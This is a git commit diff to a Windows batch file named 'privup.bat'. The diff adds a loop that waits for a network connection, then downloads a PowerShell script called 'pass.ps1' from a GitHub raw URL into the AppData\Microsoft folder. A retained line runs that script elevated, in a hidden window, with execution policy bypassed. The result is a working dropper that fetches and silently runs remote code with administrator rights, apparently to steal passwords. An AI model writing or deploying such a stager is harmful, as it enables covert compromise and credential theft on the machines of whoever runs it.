284730e966a5e22c4970c192a1b7be8bf6de9d28
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-11-12 12:54:14 +0400

    Update privup.bat

--- privup.bat
+++ privup.bat
@@ -1,5 +1,9 @@
 @echo off
-cd %userprofile%\
+:internet
+ping -n 3 -w 700 google.com | find "bytes="
+IF %ERRORLEVEL% EQU 0 ( goto run ) else ( goto internet )
+
+:run
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Microsoft\pass.ps1"
+timeout /t 20
 powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\pass.ps1' -WindowStyle Hidden -Verb RunAs"
-
-
